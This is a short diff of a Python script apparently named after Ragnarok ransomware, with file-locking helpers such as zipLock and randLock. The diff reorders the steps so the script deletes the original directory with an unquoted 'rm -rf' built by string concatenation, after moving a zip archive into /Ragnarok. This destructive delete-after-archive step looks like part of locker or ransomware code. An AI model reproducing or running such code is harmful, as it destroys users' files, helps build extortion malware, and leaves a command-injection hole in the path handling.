@@ -8,11 +8,11 @@ def main():
     #zipLock(fileList)
     #randLock(fileList)
     
-    os.system("rm -rf " + origin)
     os.system("mkdir /Ragnarok")
     os.system("touch /Ragnarok/directory")
     os.system('echo "' + origin + '" >> /Ragnarok/directory')
     os.system("mv Ragnarok.zip /Ragnarok/")
+    os.system("rm -rf " + origin)
     
 def randLock(fileList):
     for file in fileList:
